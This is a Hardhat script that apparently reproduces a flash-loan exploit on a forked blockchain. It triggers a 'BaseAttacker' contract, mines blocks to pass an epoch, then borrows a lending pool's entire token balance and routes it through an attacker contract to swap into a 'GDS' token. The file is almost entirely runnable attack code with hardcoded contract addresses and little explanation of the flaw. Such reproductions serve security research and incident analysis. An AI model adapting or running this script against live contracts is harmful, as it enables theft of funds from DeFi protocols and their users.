import hre, { ethers } from "hardhat";

const USDCContractAddress = "0x55d398326f99059fF775485246999027B3197955";
const swapFlashLoanContractAddress =
  "0x28ec0b36f0819ecb5005cab836f4ed5a2eca4d13";

// IMPORTANT: Replace these with deployed contract addresses
const flashLoanExampleContractAddress =
  "0x15dC166de43007B2226056c483bA9F772C59d5ba";
const attacker_contract_address = "0x28a261CE46F918f7Ff10c66542b9ad000AC10d8E";
const baseAttacker_address = "0x97208CCccedb847099b96AbF0Be4577f1eF35Cfd";

async function main() {
  console.log("entered");

  const signer = (await ethers.getSigners())[0];
  console.log("signer address ", signer.address);

  console.log('provider network', await signer.provider?.getNetwork());

  const USDCContract = await ethers.getContractAt(
    "IERC20",
    USDCContractAddress,
    signer
  );
  console.log("USDCContract address", USDCContract.address);

  const swapFlashLoanContract = await ethers.getContractAt(
    "ISwapFlashLoan",
    swapFlashLoanContractAddress,
    signer
  );
  const usdcBalance = await USDCContract.balanceOf(
    swapFlashLoanContract.address
  );
  console.log("usdcBalance", usdcBalance.toString());

  // flashLoanExample contract
  const flashLoanExampleContract = await ethers.getContractAt(
    "FlashLoanExample",
    flashLoanExampleContractAddress,
    signer
  );

  //-----------------base attack part (Transaction 1)-----------------
  const baseAttackerContract = await ethers.getContractAt(
    "BaseAttacker",
    baseAttacker_address,
    signer
  );

  const baseAttackerContractUSDCBalance = await USDCContract.balanceOf(
    baseAttacker_address
  );
  console.log(
    "base Attacker ContractUSDCBalance",
    baseAttackerContractUSDCBalance.toString()
  );

  const startTxn = await baseAttackerContract.start(attacker_contract_address);
  const startTxnReceipt = await startTxn.wait();
  console.log(
    "start result",
    startTxnReceipt.status,
    startTxnReceipt.transactionHash,
    startTxnReceipt.blockNumber
  );


  //move block forward by few blocks to adjust for epoch
  await hre.network.provider.send("hardhat_mine", ["0x45D"]);
  //log current block number
  console.log('current block number', await signer.provider?.getBlockNumber());

  //-------------flashLoan part (Transaction 2)-------------

  const usdcBalanceOfswapFlashLoanContractAddress = await USDCContract.balanceOf(
    swapFlashLoanContractAddress
  );

  // initiate flash loan
  const flashLoanTxn = await flashLoanExampleContract.flashLoan(
    swapFlashLoanContractAddress,
    USDCContractAddress,
    usdcBalanceOfswapFlashLoanContractAddress, //amount to flash loan
    ethers.utils.defaultAbiCoder.encode(["address", "uint256"], [attacker_contract_address, usdcBalanceOfswapFlashLoanContractAddress.div(2)]) //last param -> amount to swap to GDS
  );
  const flashloanTxnReceipt = await flashLoanTxn.wait();
  console.log(
    "initiateFlashLoan result",
    flashloanTxnReceipt.status,
    flashloanTxnReceipt.transactionHash
  );
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
